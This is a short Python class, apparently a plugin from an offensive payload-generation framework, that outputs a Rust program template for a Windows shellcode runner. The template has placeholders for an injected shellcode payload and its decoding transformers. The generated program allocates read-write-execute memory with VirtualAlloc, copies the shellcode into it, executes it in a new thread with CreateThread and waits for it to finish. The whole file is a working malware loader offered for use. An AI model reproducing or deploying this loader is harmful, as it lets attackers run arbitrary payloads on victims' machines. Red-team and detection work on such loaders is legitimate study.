class shellcoderunner:

    def imports(self):
        return ["extern crate winapi;"]

    def compilerOptions(self):
        return []

    def template(self):
        return """
{imports}

use winapi::um::memoryapi::VirtualAlloc;
use winapi::um::processthreadsapi::CreateThread;
use winapi::um::synchapi::WaitForSingleObject;
use winapi::um::winnt::{{MEM_COMMIT, PAGE_EXECUTE_READWRITE}};
use std::ptr::null_mut;

{codeblocks}

fn main() {{
    
    {shellcode}
    {transformers}
    unsafe {{
        let func_addr = VirtualAlloc(
            null_mut(),
            shellcode.len(),
            MEM_COMMIT,
            PAGE_EXECUTE_READWRITE, 
        );
		
        std::ptr::copy_nonoverlapping(shellcode.as_ptr(), func_addr as *mut u8, shellcode.len());

        let mut thread_id: u32 = 0; 
        let h_thread = CreateThread( 
            null_mut(), 
            0,
            Some(std::mem::transmute(func_addr)), 
            null_mut(),
            0,
            &mut thread_id as *mut u32, 
        );

        WaitForSingleObject(h_thread, 0xFFFFFFFF); 
    }}
}}
"""